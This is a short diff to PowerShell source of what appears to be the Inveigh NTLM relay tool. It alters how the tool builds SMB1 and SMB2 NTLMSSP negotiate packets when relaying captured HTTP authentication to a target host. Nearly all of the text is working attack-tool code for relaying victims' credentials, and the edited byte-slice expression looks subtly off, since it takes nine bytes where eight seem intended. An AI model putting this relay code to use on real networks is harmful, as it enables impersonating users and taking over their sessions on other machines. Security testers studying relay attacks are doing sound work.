@@ -1445,7 +1445,7 @@ $SMB_relay_challenge_scriptblock =
                     if($SMB_version -eq 'SMB1')
                     {
                         $packet_SMB_header = Get-PacketSMBHeader 0x73 0x18 0x01,0x48 0xff,0xff $inveigh.process_ID_bytes 0x00,0x00
-                        $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 0x06,0x03,0x80,0x25,0x00,0x00,0x00,0x0f
+                        $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.length-8)..($HTTP_request_bytes.length)]
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                         $packet_SMB_data = Get-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
@@ -1458,7 +1458,7 @@ $SMB_relay_challenge_scriptblock =
                     {
                         $SMB2_message_ID += 1
                         $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 0x06,0x03,0x80,0x25,0x00,0x00,0x00,0x0f
+                        $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.length-8)..($HTTP_request_bytes.length)]
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                         $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
@@ -2516,7 +2516,7 @@ $HTTP_scriptblock =
                             $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
                             $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
                             $SMB_session_ID = $SMB_relay_bytes[44..51]
-
+                            
                             if([System.BitConverter]::ToString($SMB_relay_bytes[4..7]) -eq 'ff-53-4d-42')
                             {
                                 $SMB_version -eq 'SMB1'
